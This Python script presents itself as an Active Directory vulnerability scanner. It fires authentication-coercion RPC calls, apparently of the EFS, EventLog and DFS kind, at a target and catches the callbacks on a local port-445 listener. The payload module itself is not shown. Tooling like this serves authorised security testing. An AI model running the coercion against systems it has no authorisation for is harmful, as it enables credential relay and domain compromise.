import argparse
import logging
import socketserver
import sys
import threading
import time

from certipy.lib.target import Target
from concurrent.futures import ThreadPoolExecutor, wait

from bullets import Cannon, efs2, efs1, even1, dfs1
from impacket.examples import logger
from certipy.commands.parsers import target

available_rpcs = {
    'efs1': efs1,
    'efs2': efs2,
    'even': even1,
    'dfs': dfs1
}


class ThreadedTCPRequestHandler(socketserver.BaseRequestHandler):

    def handle(self):
        data = self.request.recv(1024)
        print(f'[+] connection from {self.client_address[0]}:{self.client_address[1]}', )
        # print(data)
        cur_thread = threading.current_thread()
        # response = bytes("{}: {}".format(cur_thread.name, data), 'ascii')
        # self.request.sendall(response)
        self.request.close()


class ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    pass


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        add_help=False,
        description="Active Directory Vulnerability Scanner",
    )

    parser.add_argument("-h", "--help", action="help", default=argparse.SUPPRESS,
                        help="Show this help message and exit")
    parser.add_argument('-ts', action='store_true', help='adds timestamp to every logging output')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    target.add_argument_group(parser)

    parser.add_argument('-rpcs', nargs='+', choices=available_rpcs.keys(), default=('efs2',), help='rpcs to use')
    parser.add_argument('-listener', action='store', help='listener')

    options = parser.parse_args()
    logger.init(options.ts)

    if len(sys.argv) < 2:
        parser.print_help()
        sys.exit(1)
    server = ThreadedTCPServer(("0.0.0.0", 445), ThreadedTCPRequestHandler)
    target = Target()
    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
    else:
        logging.getLogger().setLevel(logging.INFO)
    options.no_pass = True
    t = Target.from_options(options)
    listener = options.listener
    time_start = time.time()
    with server:
        ip, port = server.server_address

        # Start a thread with the server -- that thread will then start one
        # more thread for each request
        server_thread = threading.Thread(target=server.serve_forever)
        # Exit the server thread when the main thread terminates
        server_thread.daemon = True
        server_thread.start()
        print("Server loop running in thread:", server_thread.name)
        cannons = []

        logging.info(f'{len(options.rpcs)} cannons loaded. fire!')
        for rpc in options.rpcs:
            cannon = Cannon(**(available_rpcs.get(rpc))._asdict(), shooter=listener, target=t, delay=0.5, timeout=5)
            cannon.shoot()
            cannons.append(cannon)


        # with ThreadPoolExecutor(max_workers=10) as pool:
        #     fs = [pool.submit(cannon.shoot) for cannon in cannons]
        #     wait(fs)
        time_end = time.time()

        logging.info(f'\n\n all jobs done,costs {int(time_end - time_start)}s exit after 5 seconds..')
        time.sleep(5)
        server.shutdown()
